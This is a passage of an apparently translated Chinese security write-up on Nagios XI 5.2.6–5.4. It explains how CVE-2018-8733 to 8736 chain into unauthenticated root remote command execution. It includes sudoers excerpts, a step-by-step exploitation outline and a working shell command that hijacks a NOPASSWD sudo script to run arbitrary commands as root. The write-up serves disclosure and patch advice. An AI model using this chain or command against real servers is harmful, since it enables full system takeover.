    OK
    12
但是，别忘了我们进行的是白盒测试，所以可以直接将文件放到/tmp目录，然后进行相应的验证：
    [root@nagiosxi_host tmp]# ls -l
    ...
    -rw-r--r--  1 nagios nagios       0 Apr 13 02:21 testing
    ...
[+] 我们可以注入命令！
[-] 已通过身份验证，并且需要管理员级别的授权。
**CVE-2018-8736 —— 本地权限提升**
* * *
最后，我们需要寻找一些本地权限提升漏洞，原因吗，不说大家也知道的。一般来说，在linux环境下查找本地权限提升漏洞时，首当其冲的就是sudoers文件。以下内容摘自Nagios/etc/sudoers文件：
    ...
    NAGIOSXI ALL = NOPASSWD:/usr/local/nagiosxi/html/includes/components/profile/getprofile.sh
    NAGIOSXI ALL = NOPASSWD:/usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    NAGIOSXI ALL = NOPASSWD:/usr/local/nagiosxi/scripts/change_timezone.sh
    NAGIOSXI ALL = NOPASSWD:/usr/local/nagiosxi/scripts/manage_services.sh *
    NAGIOSXI ALL = NOPASSWD:/usr/local/nagiosxi/scripts/reset_config_perms.sh
    NAGIOSXI ALL = NOPASSWD:/usr/local/nagiosxi/scripts/backup_xi.sh *
    ...
这正是我们感兴趣的，特别是，如果这些文件的文件权限允许对nagiosxi用户执行写操作的话，则可以：
    [root@nagiosxi_host ]# ls -l /usr/local/nagiosxi/scripts/
    ...
    -rwxr-xr-x 1 nagios nagios   1664 Dec 28  2016 change_timezone.sh
    -rwxr-xr-x 1 nagios nagios   2303 Dec 28  2016 manage_services.sh
    -rwxr-xr-x 1 nagios nagios   2681 Dec 28  2016 upgrade_to_latest.sh
    -rwxr-xr-x 1 nagios nagios   1010 Dec 28  2016 reset_config_perms.sh
    -rwxr-xr-x 1 nagios nagios   5673 Dec 28  2016 backup_xi.sh
    ...
所以，这就是一个本地权限提升的例子。为此，只需将nagiosxi用户需要以root用户身份执行的所有命令都放到出现在sudoers文件中的某个脚本中，然后通过无需密码的sudo命令来调用该脚本即可。
[+] 这是本地权限提升漏洞！用户nagiosxi可以非常轻松地升级为root权限。
[-] 这是本地权限提升漏洞，并且任何以nagiosxi身份执行命令的人都会变身为系统管理用户。
**漏洞组合拳！**
* * *
对于上面这几个漏洞，如果单兵作战的话，是掀不起什么大风大浪的：虽然可以修改一些未认证的应用程序参数，但这顶多可以用来拿下应用程序本身；可以利用SQLi漏洞，却无法搞到nagiosxi认证数据；虽然可以注入命令，但这需要已认证的管理会话；虽然有本地权限提升漏洞，但需要通过命令行才能访问应用程序服务器。然而，如果将这些漏洞组合使用的话，就能得到一个无需身份认证的、具有root权限的远程命令执行漏洞！
如果要了解相关细节的话，最好直接查看漏洞利用代码；但是现在，我们先来了解一下一般步骤：
第0步：检查nagios的版本 ——
上面介绍的所有漏洞都适用于NagiosXI的5.2.6至5.4版本；此外，我们可以从/nagiosxi/login.php中解析相应的版本字符串。
第1步：利用CVE-2018-8733漏洞将数据库用户改为root用户 ——
我们可以将nagiosql数据库用户改为root用户，以授予其足够的权限来访问nagiosxi的认证数据。
第2步：利用SQLi访问API密钥 ——
现在，数据库用户已经拥有了足够的权限，我们使用CVE-2018-8734漏洞执行SQL注入，以返回系统中所有唯一的API密钥。该应用程序似乎将一个管理API密钥存储到了数据库中，因此这是一个非常可靠的选择。
第3步：使用API密钥添加管理用户 —— 如果您拥有适当的API密钥的话，那么这就称不上漏洞了，只是一个可用于添加管理用户的API而已。
第4步：登录 —— 既然已经拥有系统的管理账户，自然就可以顺利登录系统了。现在，我们已经有效地绕过了针对应用程序的nagiosxi部分的身份验证了。
第5步：注入命令+提升权限 ——
这里，我们通过CVE-2018-8735（命令注入漏洞）来执行命令。一旦在应用服务器上获得了一个会话，就可以建立一个低权限的反向shell，然后再提升权限即可。但是，就我们的PoC而言，由于已将所需的命令放入临时的权限提升脚本中，所以只需执行这个脚本，上述所有工作就可以一气呵成了：
    cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak &&
    echo "{your_command_here}" > /usr/local/nagiosxi/scripts/reset_config_perms.sh &&
    sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh &&
    mv /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak /usr/local/nagiosxi/scripts/reset_config_perms.sh
这个脚本通过将所需命令放入/usr/local/nagiosxi/scripts/reset_config_perms.sh文件，然后使用无需密码的sudo命令调用该脚本来利用CVE-2018-8736漏洞。其中，第一行和最后一行命令分别用于备份和恢复原始脚本。
**小结**
* * *
现在，我们已经大功告成了！
按照上述步骤，我们能够将四个漏洞（它们危害程度不同，而且会引发警告）转换为一个root级别的RCE漏洞，并且不会引起任何警告。通过这个案例，能给我们带来哪些警示？我想应该很多。
对于应用程序中存在的各种漏洞，我们不应该孤立地看待它们，至少应该从组合的角度重新加以审视。换句话说，如果不修复看似低风险的漏洞，可能导致非常严重的后果。
如果您当前运行的NagiosXI的版本号介于5.2.6到5.4.12之间的话，请不要犹豫，立即更新。